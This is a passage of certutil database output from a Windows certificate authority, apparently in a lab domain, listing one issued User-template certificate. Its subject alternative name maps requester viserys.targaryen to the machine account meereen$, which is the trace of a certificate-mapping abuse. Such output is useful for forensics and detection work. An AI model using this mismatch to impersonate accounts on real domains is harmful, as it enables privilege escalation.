 certutil.exe -v -view -restrict "RequestID=94" -gmt -out Request.RequestID,Request.RawRequest,Request.RawArchivedKey,Request.KeyRecoveryHashes,Request.RawOldCertificate,Request.RequestAttributes,Request.RequestType,Request.RequestFlags,Request.StatusCode,Request.Disposition,Request.DispositionMessage,Request.SubmittedWhen,Request.ResolvedWhen,Request.RevokedWhen,Request.RevokedEffectiveWhen,Request.RevokedReason,Request.RequesterName,Request.CallerName,Request.SignerPolicies,Request.SignerApplicationPolicies,Request.Officer,Request.DistinguishedName,Request.RawName,Request.Country,Request.Organization,Request.OrgUnit,Request.CommonName,Request.Locality,Request.State,Request.Title,Request.GivenName,Request.Initials,Request.SurName,Request.DomainComponent,Request.EMail,Request.StreetAddress,Request.UnstructuredName,Request.UnstructuredAddress,Request.DeviceSerialNumber,Request.AttestationChallenge,Request.EndorsementKeyHash,Request.EndorsementCertificateHash,Request.RawPrecertificate,RequestID,RawCertificate,CertificateHash,CertificateTemplate,EnrollmentFlags,GeneralFlags,PrivatekeyFlags,SerialNumber,IssuerNameID,NotBefore,NotAfter,SubjectKeyIdentifier,RawPublicKey,PublicKeyLength,PublicKeyAlgorithm,RawPublicKeyAlgorithmParameters,PublishExpiredCertInCRL,UPN,DistinguishedName,RawName,Country,Organization,OrgUnit,CommonName,Locality,State,Title,GivenName,Initials,SurName,DomainComponent,EMail,StreetAddress,UnstructuredName,UnstructuredAddress,DeviceSerialNumber
Schema:
  Column Name                   Localized Name                Type    MaxLength
  ----------------------------  ----------------------------  ------  ---------
  Request.RequestID             Request ID                    Long    4 -- Indexed
  Request.RawRequest            Binary Request                Binary  65536
  Request.RawArchivedKey        Archived Key                  Binary  65536
  Request.KeyRecoveryHashes     Key Recovery Agent Hashes     String  8192
  Request.RawOldCertificate     Old Certificate               Binary  16384
  Request.RequestAttributes     Request Attributes            String  32768
  Request.RequestType           Request Type                  Long    4
  Request.RequestFlags          Request Flags                 Long    4
  Request.StatusCode            Request Status Code           Long    4
  Request.Disposition           Request Disposition           Long    4 -- Indexed
  Request.DispositionMessage    Request Disposition Message   String  8192
  Request.SubmittedWhen         Request Submission Date       Date    8 -- Indexed
  Request.ResolvedWhen          Request Resolution Date       Date    8 -- Indexed
  Request.RevokedWhen           Revocation Date               Date    8
  Request.RevokedEffectiveWhen  Effective Revocation Date     Date    8 -- Indexed
  Request.RevokedReason         Revocation Reason             Long    4
  Request.RequesterName         Requester Name                String  2048 -- Indexed
  Request.CallerName            Caller Name                   String  2048 -- Indexed
  Request.SignerPolicies        Signer Policies               String  8192
  Request.SignerApplicationPolicies  Signer Application Policies   String  8192
  Request.Officer               Officer                       Long    4
  Request.DistinguishedName     Request Distinguished Name    String  8192
  Request.RawName               Request Binary Name           Binary  4096
  Request.Country               Request Country/Region        String  8192
  Request.Organization          Request Organization          String  8192
  Request.OrgUnit               Request Organization Unit     String  8192
  Request.CommonName            Request Common Name           String  8192
  Request.Locality              Request City                  String  8192
  Request.State                 Request State                 String  8192
  Request.Title                 Request Title                 String  8192
  Request.GivenName             Request First Name            String  8192
  Request.Initials              Request Initials              String  8192
  Request.SurName               Request Last Name             String  8192
  Request.DomainComponent       Request Domain Component      String  8192
  Request.EMail                 Request Email Address         String  8192
  Request.StreetAddress         Request Street Address        String  8192
  Request.UnstructuredName      Request Unstructured Name     String  8192
  Request.UnstructuredAddress   Request Unstructured Address  String  8192
  Request.DeviceSerialNumber    Request Device Serial Number  String  8192
  Request.AttestationChallenge  Attestation Challenge         Binary  4096
  Request.EndorsementKeyHash    Endorsement Key Hash          String  144 -- Indexed
  Request.EndorsementCertificateHash  Endorsement Certificate Hash  String  144 -- Indexed
  Request.RawPrecertificate     Binary Precertificate         Binary  16384
  RequestID                     Issued Request ID             Long    4 -- Indexed
  RawCertificate                Binary Certificate            Binary  16384
  CertificateHash               Certificate Hash              String  128 -- Indexed
  CertificateTemplate           Certificate Template          String  254 -- Indexed
  EnrollmentFlags               Template Enrollment Flags     Long    4
  GeneralFlags                  Template General Flags        Long    4
  PrivatekeyFlags               Template Private Key Flags    Long    4
  SerialNumber                  Serial Number                 String  128 -- Indexed
  IssuerNameID                  Issuer Name ID                Long    4
  NotBefore                     Certificate Effective Date    Date    8
  NotAfter                      Certificate Expiration Date   Date    8 -- Indexed
  SubjectKeyIdentifier          Issued Subject Key Identifier  String  128 -- Indexed
  RawPublicKey                  Binary Public Key             Binary  4096
  PublicKeyLength               Public Key Length             Long    4
  PublicKeyAlgorithm            Public Key Algorithm          String  254
  RawPublicKeyAlgorithmParameters  Public Key Algorithm Parameters  Binary  4096
  PublishExpiredCertInCRL       Publish Expired Certificate in CRL  Long    4
  UPN                           User Principal Name           String  2048 -- Indexed
  DistinguishedName             Issued Distinguished Name     String  8192
  RawName                       Issued Binary Name            Binary  4096
  Country                       Issued Country/Region         String  8192
  Organization                  Issued Organization           String  8192
  OrgUnit                       Issued Organization Unit      String  8192
  CommonName                    Issued Common Name            String  8192 -- Indexed
  Locality                      Issued City                   String  8192
  State                         Issued State                  String  8192
  Title                         Issued Title                  String  8192
  GivenName                     Issued First Name             String  8192
  Initials                      Issued Initials               String  8192
  SurName                       Issued Last Name              String  8192
  DomainComponent               Issued Domain Component       String  8192
  EMail                         Issued Email Address          String  8192
  StreetAddress                 Issued Street Address         String  8192
  UnstructuredName              Issued Unstructured Name      String  8192
  UnstructuredAddress           Issued Unstructured Address   String  8192
  DeviceSerialNumber            Issued Device Serial Number   String  8192

Row 1:
  Request ID: 0x5e (94)
  Binary Request:
-----BEGIN NEW CERTIFICATE REQUEST-----
MIICYTCCAUkCAQAwHDEaMBgGA1UEAwwRVmlzZXJ5cy50YXJnYXJ5ZW4wggEiMA0G
CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC7ptNQe1swAG/tTuZco5fjx1tWTgOX
UZmRA8qhN3LWjtjnY+rLc3UCIt9r1/Swpz8h6TuQ+wJth2DU2yUcrp6rH+EEC+Qb
MfPzFUDgZdfnKZWw817+fBHZaEJScPPQtcu5kqAvsjbsQ1Kc4m+DiHNHUQ6j3FVw
9Pb6rfanuA6PKv5jhwIpbRRkDXa47ze1QvsxvyCDPRN8lbGdhO+NxrllLln2zaSm
K4Buz1CDQOuDj9EwmX4VsfkfDwRMRFkoUeez1VjNbYgvv0j1dS4GBdxZY5Q5XwlD
xGf57AkoGBSHY0DkfBCH8TchYC8eI8ycFuLks3iqlFbcSwc2iW7tGXlFAgMBAAGg
ADANBgkqhkiG9w0BAQsFAAOCAQEAW9U8hHQNNRw5iDQoaR/9qoEAecqlWItBYKPM
XtVcigs0AV4a4nfhuStjSfHkrlG03g/fVPdjXW595W8n2uUtJgpZu8QG23lVMAx0
NNPl72Tja+5SEFkcuwXkrAX1XiQcgQoITxnUW2cuqcU/7YjqW+eMph1G0xYeI3lu
Bp5EnZ2HsOCpzG/Shsf2ZXrFF6n0Psi3eTi9Q07WRt2ejT1jSgjiuNc+mSk6GQoG
Csqtc1CtfXmN+++g+IYycaWzNPqwJ/D3jjFjqS5h4XiiSt45ySr92/Y2P5OlXtmz
2BfC8JTnw6EO+3cLMO29FNZFQCW1f/fNgMRxjEjEH85Fy5DdNw==
-----END NEW CERTIFICATE REQUEST-----

PKCS10 Certificate Request:
Version: 1
Subject:
    CN=Viserys.targaryen
  Name Hash(sha1): 6a9f65aad7b9c0b669f63368987c5922e851c9ef
  Name Hash(md5): 4f44096017c4181d7daaade25b2d1b7b

Public Key Algorithm:
    Algorithm ObjectId: 1.2.840.113549.1.1.1 RSA (RSA_SIGN)
    Algorithm Parameters:
    05 00
Public Key Length: 2048 bits
Public Key: UnusedBits = 0
    0000  30 82 01 0a 02 82 01 01  00 bb a6 d3 50 7b 5b 30
    0010  00 6f ed 4e e6 5c a3 97  e3 c7 5b 56 4e 03 97 51
    0020  99 91 03 ca a1 37 72 d6  8e d8 e7 63 ea cb 73 75
    0030  02 22 df 6b d7 f4 b0 a7  3f 21 e9 3b 90 fb 02 6d
    0040  87 60 d4 db 25 1c ae 9e  ab 1f e1 04 0b e4 1b 31
    0050  f3 f3 15 40 e0 65 d7 e7  29 95 b0 f3 5e fe 7c 11
    0060  d9 68 42 52 70 f3 d0 b5  cb b9 92 a0 2f b2 36 ec
    0070  43 52 9c e2 6f 83 88 73  47 51 0e a3 dc 55 70 f4
    0080  f6 fa ad f6 a7 b8 0e 8f  2a fe 63 87 02 29 6d 14
    0090  64 0d 76 b8 ef 37 b5 42  fb 31 bf 20 83 3d 13 7c
    00a0  95 b1 9d 84 ef 8d c6 b9  65 2e 59 f6 cd a4 a6 2b
    00b0  80 6e cf 50 83 40 eb 83  8f d1 30 99 7e 15 b1 f9
    00c0  1f 0f 04 4c 44 59 28 51  e7 b3 d5 58 cd 6d 88 2f
    00d0  bf 48 f5 75 2e 06 05 dc  59 63 94 39 5f 09 43 c4
    00e0  67 f9 ec 09 28 18 14 87  63 40 e4 7c 10 87 f1 37
    00f0  21 60 2f 1e 23 cc 9c 16  e2 e4 b3 78 aa 94 56 dc
    0100  4b 07 36 89 6e ed 19 79  45 02 03 01 00 01
Request Attributes: 0
  0 attributes:
Signature Algorithm:
    Algorithm ObjectId: 1.2.840.113549.1.1.11 sha256RSA
    Algorithm Parameters:
    05 00
Signature: UnusedBits=0
    0000  37 dd 90 cb 45 ce 1f c4  48 8c 71 c4 80 cd f7 7f
    0010  b5 25 40 45 d6 14 bd ed  30 0b 77 fb 0e a1 c3 e7
    0020  94 f0 c2 17 d8 b3 d9 5e  a5 93 3f 36 f6 db fd 2a
    0030  c9 39 de 4a a2 78 e1 61  2e a9 63 31 8e f7 f0 27
    0040  b0 fa 34 b3 a5 71 32 86  f8 a0 ef fb 8d 79 7d ad
    0050  50 73 ad ca 0a 06 0a 19  3a 29 99 3e d7 b8 e2 08
    0060  4a 63 3d 8d 9e dd 46 d6  4e 43 bd 38 79 b7 c8 3e
    0070  f4 a9 17 c5 7a 65 f6 c7  86 d2 6f cc a9 e0 b0 87
    0080  9d 9d 44 9e 06 6e 79 23  1e 16 d3 46 1d a6 8c e7
    0090  5b ea 88 ed 3f c5 a9 2e  67 5b d4 19 4f 08 0a 81
    00a0  1c 24 5e f5 05 ac e4 05  bb 1c 59 10 52 ee 6b e3
    00b0  64 ef e5 d3 34 74 0c 30  55 79 db 06 c4 bb 59 0a
    00c0  26 2d e5 da 27 6f e5 7d  6e 5d 63 f7 54 df 0f de
    00d0  b4 51 ae e4 f1 49 63 2b  b9 e1 77 e2 1a 5e 01 34
    00e0  0b 8a 5c d5 5e cc a3 60  41 8b 58 a5 ca 79 00 81
    00f0  aa fd 1f 69 28 34 88 39  1c 35 0d 74 84 3c d5 5b
Signature matches Public Key
Key Id Hash(rfc-sha1): 11fc2717c0b1527e7c258048a53aef3ca77312c2
Key Id Hash(sha1): 525bff29f17bfb1c98eebd00b2869b427f6408b4
Key Id Hash(bcrypt-sha1): 95023912764d1b40ab72ac82508a2ef92a71ea13
Key Id Hash(bcrypt-sha256): ef296fe8e0a1246533286cf2424eb25d680fbdf109feac76f0afdb0ec6291ab2

  Archived Key: EMPTY
  Key Recovery Agent Hashes: EMPTY
  Old Certificate: EMPTY
  Request Attributes: "CertificateTemplate:User"
0000    43 00 65 00 72 00 74 00  69 00 66 00 69 00 63 00   C.e.r.t.i.f.i.c.
0010    61 00 74 00 65 00 54 00  65 00 6d 00 70 00 6c 00   a.t.e.T.e.m.p.l.
0020    61 00 74 00 65 00 3a 00  55 00 73 00 65 00 72 00   a.t.e.:.U.s.e.r.

  Request Type: 0x100 (256) -- PKCS10
  Request Flags: 0x4 -- Force UTF-8
  Request Status Code: 0x0 (WIN32: 0) -- The operation completed successfully.
  Request Disposition: 0x14 (20) -- Issued
  Request Disposition Message: "Issued"
0000    49 00 73 00 73 00 75 00  65 00 64 00               I.s.s.u.e.d.

  Request Submission Date: 8/17/2025 6:10 PM GMT
  Request Resolution Date: 8/17/2025 6:10 PM GMT
  Revocation Date: EMPTY
  Effective Revocation Date: EMPTY
  Revocation Reason: EMPTY
  Requester Name: "ESSOS\viserys.targaryen"
0000    45 00 53 00 53 00 4f 00  53 00 5c 00 76 00 69 00   E.S.S.O.S.\.v.i.
0010    73 00 65 00 72 00 79 00  73 00 2e 00 74 00 61 00   s.e.r.y.s...t.a.
0020    72 00 67 00 61 00 72 00  79 00 65 00 6e 00         r.g.a.r.y.e.n.

  Caller Name: "ESSOS\viserys.targaryen"
0000    45 00 53 00 53 00 4f 00  53 00 5c 00 76 00 69 00   E.S.S.O.S.\.v.i.
0010    73 00 65 00 72 00 79 00  73 00 2e 00 74 00 61 00   s.e.r.y.s...t.a.
0020    72 00 67 00 61 00 72 00  79 00 65 00 6e 00         r.g.a.r.y.e.n.

  Signer Policies: EMPTY
  Signer Application Policies: EMPTY
  Officer: EMPTY
  Request Distinguished Name: "CN=Viserys.targaryen"
0000    43 00 4e 00 3d 00 56 00  69 00 73 00 65 00 72 00   C.N.=.V.i.s.e.r.
0010    79 00 73 00 2e 00 74 00  61 00 72 00 67 00 61 00   y.s...t.a.r.g.a.
0020    72 00 79 00 65 00 6e 00                            r.y.e.n.

  Request Binary Name:
0000    30 1c 31 1a 30 18 06 03  55 04 03 0c 11 56 69 73   0.1.0...U....Vis
0010    65 72 79 73 2e 74 61 72  67 61 72 79 65 6e         erys.targaryen

  Request Country/Region: EMPTY
  Request Organization: EMPTY
  Request Organization Unit: EMPTY
  Request Common Name: "Viserys.targaryen"
0000    56 00 69 00 73 00 65 00  72 00 79 00 73 00 2e 00   V.i.s.e.r.y.s...
0010    74 00 61 00 72 00 67 00  61 00 72 00 79 00 65 00   t.a.r.g.a.r.y.e.
0020    6e 00                                              n.

  Request City: EMPTY
  Request State: EMPTY
  Request Title: EMPTY
  Request First Name: EMPTY
  Request Initials: EMPTY
  Request Last Name: EMPTY
  Request Domain Component: EMPTY
  Request Email Address: EMPTY
  Request Street Address: EMPTY
  Request Unstructured Name: EMPTY
  Request Unstructured Address: EMPTY
  Request Device Serial Number: EMPTY
  Attestation Challenge: EMPTY
  Endorsement Key Hash: EMPTY
  Endorsement Certificate Hash: EMPTY
  Binary Precertificate: EMPTY
  Issued Request ID: 0x5e (94)
  Binary Certificate:
-----BEGIN CERTIFICATE-----
MIIGTzCCBTegAwIBAgITIAAAAF719TehNmMvjQAAAAAAXjANBgkqhkiG9w0BAQsF
ADBBMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFTATBgoJkiaJk/IsZAEZFgVlc3Nv
czERMA8GA1UEAxMIRVNTT1MtQ0EwHhcNMjUwODE3MTgwMDU0WhcNMjYwODE3MTgw
MDU0WjCBgTEVMBMGCgmSJomT8ixkARkWBWxvY2FsMRUwEwYKCZImiZPyLGQBGRYF
ZXNzb3MxDjAMBgNVBAMTBVVzZXJzMRowGAYDVQQDExF2aXNlcnlzLnRhcmdhcnll
bjElMCMGCSqGSIb3DQEJARYWa2hhbC5kcm9nb0Blc3Nvcy5sb2NhbDCCASIwDQYJ
KoZIhvcNAQEBBQADggEPADCCAQoCggEBALum01B7WzAAb+1O5lyjl+PHW1ZOA5dR
mZEDyqE3ctaO2Odj6stzdQIi32vX9LCnPyHpO5D7Am2HYNTbJRyunqsf4QQL5Bsx
8/MVQOBl1+cplbDzXv58EdloQlJw89C1y7mSoC+yNuxDUpzib4OIc0dRDqPcVXD0
9vqt9qe4Do8q/mOHAiltFGQNdrjvN7VC+zG/IIM9E3yVsZ2E743GuWUuWfbNpKYr
gG7PUINA64OP0TCZfhWx+R8PBExEWShR57PVWM1tiC+/SPV1LgYF3FljlDlfCUPE
Z/nsCSgYFIdjQOR8EIfxNyFgLx4jzJwW4uSzeKqUVtxLBzaJbu0ZeUUCAwEAAaOC
Av0wggL5MB0GA1UdDgQWBBQR/CcXwLFSfnwlgEilOu88p3MSwjAfBgNVHSMEGDAW
gBR9TscdMz867xqQDo9PcKceZKuU8TCBxgYDVR0fBIG+MIG7MIG4oIG1oIGyhoGv
bGRhcDovLy9DTj1FU1NPUy1DQSxDTj1icmFhdm9zLENOPUNEUCxDTj1QdWJsaWMl
MjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERD
PWVzc29zLERDPWxvY2FsP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9v
YmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBugYIKwYBBQUHAQEEga0w
gaowgacGCCsGAQUFBzAChoGabGRhcDovLy9DTj1FU1NPUy1DQSxDTj1BSUEsQ049
UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJh
dGlvbixEQz1lc3NvcyxEQz1sb2NhbD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0
Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTAXBgkrBgEEAYI3FAIECh4IAFUA
cwBlAHIwDgYDVR0PAQH/BAQDAgWgMCkGA1UdJQQiMCAGCisGAQQBgjcKAwQGCCsG
AQUFBwMEBggrBgEFBQcDAjBHBgNVHREEQDA+oCQGCisGAQQBgjcUAgOgFgwUbWVl
cmVlbiRAZXNzb3MubG9jYWyBFmtoYWwuZHJvZ29AZXNzb3MubG9jYWwwTgYJKwYB
BAGCNxkCBEEwP6A9BgorBgEEAYI3GQIBoC8ELVMtMS01LTIxLTY2NjE5OTY4Mi0x
NDExMzQyMTQ3LTI5Mzg3MTc4NTUtMTExNDBEBgkqhkiG9w0BCQ8ENzA1MA4GCCqG
SIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYFKw4DAgcwCgYIKoZIhvcNAwcw
DQYJKoZIhvcNAQELBQADggEBAKT0ymdPwGp/xeTiMUAlb4wVpgRBZmZL1/UbuWXn
gBA2cnZkaS7gEvrJTQ6G/aw63OfMpzs34GUz0g6sTBP/bsAYgbPtThylWdE4JbHe
3eXVWOJ3/hTa48CjdYRHnbxpp8ywZMGsWXJnqckrmKvgX5R6Sr/fyx3mpgKXkzwt
4e4kat2wHGRwlPKLBU7qokW/Njq6BNgzXXDtDL5QygPALPHKGESI+1aFqpJGVhMp
Cl3PvWX+C72G2/wMS9lFhkPlAmkKYRY8Cu7bGEzbBrXjmxFD904zhE41Z/tKUQRC
d3cYJEzUrEGrPK5oinmrFuSAYJh7pioV4ju4GsDgaNoWAYM=
-----END CERTIFICATE-----

X509 Certificate:
Version: 3
Serial Number: 200000005ef5f537a136632f8d00000000005e
Signature Algorithm:
    Algorithm ObjectId: 1.2.840.113549.1.1.11 sha256RSA
    Algorithm Parameters:
    05 00
Issuer:
    CN=ESSOS-CA
    DC=essos
    DC=local
  Name Hash(sha1): c555fa55fe8e3e84d965d463e888a73d1877edbc
  Name Hash(md5): 26df41790381580445365a074ae47bac

 NotBefore: 8/17/2025 6:00 PM GMT
 NotAfter: 8/17/2026 6:00 PM GMT

Subject:
    E=khal.drogo@essos.local
    CN=viserys.targaryen
    CN=Users
    DC=essos
    DC=local
  Name Hash(sha1): 912ad3bc78ff3c09d741778db504fa79e66fc7b1
  Name Hash(md5): c8052fe6aeeb5055a9caaec33706e7fe

Public Key Algorithm:
    Algorithm ObjectId: 1.2.840.113549.1.1.1 RSA
    Algorithm Parameters:
    05 00
Public Key Length: 2048 bits
Public Key: UnusedBits = 0
    0000  30 82 01 0a 02 82 01 01  00 bb a6 d3 50 7b 5b 30
    0010  00 6f ed 4e e6 5c a3 97  e3 c7 5b 56 4e 03 97 51
    0020  99 91 03 ca a1 37 72 d6  8e d8 e7 63 ea cb 73 75
    0030  02 22 df 6b d7 f4 b0 a7  3f 21 e9 3b 90 fb 02 6d
    0040  87 60 d4 db 25 1c ae 9e  ab 1f e1 04 0b e4 1b 31
    0050  f3 f3 15 40 e0 65 d7 e7  29 95 b0 f3 5e fe 7c 11
    0060  d9 68 42 52 70 f3 d0 b5  cb b9 92 a0 2f b2 36 ec
    0070  43 52 9c e2 6f 83 88 73  47 51 0e a3 dc 55 70 f4
    0080  f6 fa ad f6 a7 b8 0e 8f  2a fe 63 87 02 29 6d 14
    0090  64 0d 76 b8 ef 37 b5 42  fb 31 bf 20 83 3d 13 7c
    00a0  95 b1 9d 84 ef 8d c6 b9  65 2e 59 f6 cd a4 a6 2b
    00b0  80 6e cf 50 83 40 eb 83  8f d1 30 99 7e 15 b1 f9
    00c0  1f 0f 04 4c 44 59 28 51  e7 b3 d5 58 cd 6d 88 2f
    00d0  bf 48 f5 75 2e 06 05 dc  59 63 94 39 5f 09 43 c4
    00e0  67 f9 ec 09 28 18 14 87  63 40 e4 7c 10 87 f1 37
    00f0  21 60 2f 1e 23 cc 9c 16  e2 e4 b3 78 aa 94 56 dc
    0100  4b 07 36 89 6e ed 19 79  45 02 03 01 00 01
Certificate Extensions: 10
    2.5.29.14: Flags = 0, Length = 16
    Subject Key Identifier
        11fc2717c0b1527e7c258048a53aef3ca77312c2

    2.5.29.35: Flags = 0, Length = 18
    Authority Key Identifier
        KeyID=7d4ec71d333f3aef1a900e8f4f70a71e64ab94f1

    2.5.29.31: Flags = 0, Length = be
    CRL Distribution Points
        [1]CRL Distribution Point
             Distribution Point Name:
                  Full Name:
                       URL=ldap:///CN=ESSOS-CA,CN=braavos,CN=CDP,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local?certificateRevocationList?base?objectClass=cRLDistributionPoint (ldap:///CN=ESSOS-CA,CN=braavos,CN=CDP,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=essos,DC=local?certificateRevocationList?base?objectClass=cRLDistributionPoint)

    1.3.6.1.5.5.7.1.1: Flags = 0, Length = ad
    Authority Information Access
        [1]Authority Info Access
             Access Method=Certification Authority Issuer (1.3.6.1.5.5.7.48.2)
             Alternative Name:
                  URL=ldap:///CN=ESSOS-CA,CN=AIA,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local?cACertificate?base?objectClass=certificationAuthority (ldap:///CN=ESSOS-CA,CN=AIA,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=essos,DC=local?cACertificate?base?objectClass=certificationAuthority)

    1.3.6.1.4.1.311.20.2: Flags = 0, Length = a
    Certificate Template Name (Certificate Type)
        User

    2.5.29.15: Flags = 1(Critical), Length = 4
    Key Usage
        Digital Signature, Key Encipherment (a0)

    2.5.29.37: Flags = 0, Length = 22
    Enhanced Key Usage
        Encrypting File System (1.3.6.1.4.1.311.10.3.4)
        Secure Email (1.3.6.1.5.5.7.3.4)
        Client Authentication (1.3.6.1.5.5.7.3.2)

    2.5.29.17: Flags = 0, Length = 40
    Subject Alternative Name
        Other Name:
             Principal Name=meereen$@essos.local
        RFC822 Name=khal.drogo@essos.local

    1.3.6.1.4.1.311.25.2: Flags = 0, Length = 41

    0000  30 3f a0 3d 06 0a 2b 06  01 04 01 82 37 19 02 01   0?.=..+.....7...
    0010  a0 2f 04 2d 53 2d 31 2d  35 2d 32 31 2d 36 36 36   ./.-S-1-5-21-666
    0020  31 39 39 36 38 32 2d 31  34 31 31 33 34 32 31 34   199682-141134214
    0030  37 2d 32 39 33 38 37 31  37 38 35 35 2d 31 31 31   7-2938717855-111
    0040  34                                                 4
0000: 30 3f                                     ; SEQUENCE (3f Bytes)
0002:    a0 3d                                  ; OPTIONAL[0] (3d Bytes)
0004:       06 0a                               ; OBJECT_ID (a Bytes)
0006:       |  2b 06 01 04 01 82 37 19  02 01
            |     ; 1.3.6.1.4.1.311.25.2.1
0010:       a0 2f                               ; OPTIONAL[0] (2f Bytes)
0012:          04 2d                            ; OCTET_STRING (2d Bytes)
0014:             53 2d 31 2d 35 2d 32 31  2d 36 36 36 31 39 39 36  ; S-1-5-21-6661996
0024:             38 32 2d 31 34 31 31 33  34 32 31 34 37 2d 32 39  ; 82-1411342147-29
0034:             33 38 37 31 37 38 35 35  2d 31 31 31 34           ; 38717855-1114

    1.2.840.113549.1.9.15: Flags = 0, Length = 37
    SMIME Capabilities
        [1]SMIME Capability
             Object ID=1.2.840.113549.3.2
             Parameters=02 02 00 80
        [2]SMIME Capability
             Object ID=1.2.840.113549.3.4
             Parameters=02 02 00 80
        [3]SMIME Capability
             Object ID=1.3.14.3.2.7
        [4]SMIME Capability
             Object ID=1.2.840.113549.3.7

Signature Algorithm:
    Algorithm ObjectId: 1.2.840.113549.1.1.11 sha256RSA
    Algorithm Parameters:
    05 00
Signature: UnusedBits=0
    0000  83 01 16 da 68 e0 c0 1a  b8 3b e2 15 2a a6 7b 98
    0010  60 80 e4 16 ab 79 8a 68  ae 3c ab 41 ac d4 4c 24
    0020  18 77 77 42 04 51 4a fb  67 35 4e 84 33 4e f7 43
    0030  11 9b e3 b5 06 db 4c 18  db ee 0a 3c 16 61 0a 69
    0040  02 e5 43 86 45 d9 4b 0c  fc db 86 bd 0b fe 65 bd
    0050  cf 5d 0a 29 13 56 46 92  aa 85 56 fb 88 44 18 ca
    0060  f1 2c c0 03 ca 50 be 0c  ed 70 5d 33 d8 04 ba 3a
    0070  36 bf 45 a2 ea 4e 05 8b  f2 94 70 64 1c b0 dd 6a
    0080  24 ee e1 2d 3c 93 97 02  a6 e6 1d cb df bf 4a 7a
    0090  94 5f e0 ab 98 2b c9 a9  67 72 59 ac c1 64 b0 cc
    00a0  a7 69 bc 9d 47 84 75 a3  c0 e3 da 14 fe 77 e2 58
    00b0  d5 e5 dd de b1 25 38 d1  59 a5 1c 4e ed b3 81 18
    00c0  c0 6e ff 13 4c ac 0e d2  33 65 e0 37 3b a7 cc e7
    00d0  dc 3a ac fd 86 0e 4d c9  fa 12 e0 2e 69 64 76 72
    00e0  36 10 80 e7 65 b9 1b f5  d7 4b 66 66 41 04 a6 15
    00f0  8c 6f 25 40 31 e2 e4 c5  7f 6a c0 4f 67 ca f4 a4
Non-root Certificate
Key Id Hash(rfc-sha1): 11fc2717c0b1527e7c258048a53aef3ca77312c2
Key Id Hash(sha1): 525bff29f17bfb1c98eebd00b2869b427f6408b4
Key Id Hash(bcrypt-sha1): 95023912764d1b40ab72ac82508a2ef92a71ea13
Key Id Hash(bcrypt-sha256): ef296fe8e0a1246533286cf2424eb25d680fbdf109feac76f0afdb0ec6291ab2
Key Id Hash(md5): 745566b15cab7bccbd214dd53d29c356
Key Id Hash(sha256): 650937eaa14cb856f668b43f2a4015fa118443478c03aa9c7a8071d74b882faf
Key Id Hash(pin-sha256): Dh+3y4hoDPv8hWPY3SnTXSXqLNr73Xk5lShLJUNzA6o=
Key Id Hash(pin-sha256-hex): 0e1fb7cb88680cfbfc8563d8dd29d35d25ea2cdafbdd793995284b25437303aa
Cert Hash(md5): 21f3532ea1aa94176d497f564df0da41
Cert Hash(sha1): aeb0be03e847f141baa48172541a0b7aee98df22
Cert Hash(sha256): 6b188e046d85957793d2affda835e77507c0585793d097d91524f293e501c66c
Signature Hash: b2cd099b03fc481e37a9a514ba2d95aa1ba910d81e5fcb729082a5a99a6051b0

  Certificate Hash: "ae b0 be 03 e8 47 f1 41 ba a4 81 72 54 1a 0b 7a ee 98 df 22"
0000    61 00 65 00 20 00 62 00  30 00 20 00 62 00 65 00   a.e. .b.0. .b.e.
0010    20 00 30 00 33 00 20 00  65 00 38 00 20 00 34 00    .0.3. .e.8. .4.
0020    37 00 20 00 66 00 31 00  20 00 34 00 31 00 20 00   7. .f.1. .4.1. .
0030    62 00 61 00 20 00 61 00  34 00 20 00 38 00 31 00   b.a. .a.4. .8.1.
0040    20 00 37 00 32 00 20 00  35 00 34 00 20 00 31 00    .7.2. .5.4. .1.
0050    61 00 20 00 30 00 62 00  20 00 37 00 61 00 20 00   a. .0.b. .7.a. .
0060    65 00 65 00 20 00 39 00  38 00 20 00 64 00 66 00   e.e. .9.8. .d.f.
0070    20 00 32 00 32 00                                   .2.2.

  Certificate Template: "User"
0000    55 00 73 00 65 00 72 00                            U.s.e.r.

  Template Enrollment Flags: 0x29 (41)
    CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS -- 1
      (CT_FLAG_PEND_ALL_REQUESTS -- 2)
      (CT_FLAG_PUBLISH_TO_KRA_CONTAINER -- 4)
    CT_FLAG_PUBLISH_TO_DS -- 8
      (CT_FLAG_AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE -- 10 (16))
    CT_FLAG_AUTO_ENROLLMENT -- 20 (32)
      (CT_FLAG_PREVIOUS_APPROVAL_VALIDATE_REENROLLMENT -- 40 (64))
      (CT_FLAG_DOMAIN_AUTHENTICATION_NOT_REQUIRED -- 80 (128))
      (CT_FLAG_USER_INTERACTION_REQUIRED -- 100 (256))
      (CT_FLAG_ADD_TEMPLATE_NAME -- 200 (512))
      (CT_FLAG_REMOVE_INVALID_CERTIFICATE_FROM_PERSONAL_STORE -- 400 (1024))
      (CT_FLAG_ALLOW_ENROLL_ON_BEHALF_OF -- 800 (2048))
      (CT_FLAG_ADD_OCSP_NOCHECK -- 1000 (4096))
      (CT_FLAG_ENABLE_KEY_REUSE_ON_NT_TOKEN_KEYSET_STORAGE_FULL -- 2000 (8192))
      (CT_FLAG_NOREVOCATIONINFOINISSUEDCERTS -- 4000 (16384))
      (CT_FLAG_INCLUDE_BASIC_CONSTRAINTS_FOR_EE_CERTS -- 8000 (32768))
      (CT_FLAG_ALLOW_PREVIOUS_APPROVAL_KEYBASEDRENEWAL_VALIDATE_REENROLLMENT -- 10000 (65536))
      (CT_FLAG_ISSUANCE_POLICIES_FROM_REQUEST -- 20000 (131072))
      (CT_FLAG_SKIP_AUTO_RENEWAL -- 40000 (262144))
  Template General Flags: 0x1023a (66106)
      (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT -- 1)
    CT_FLAG_ADD_EMAIL -- 2
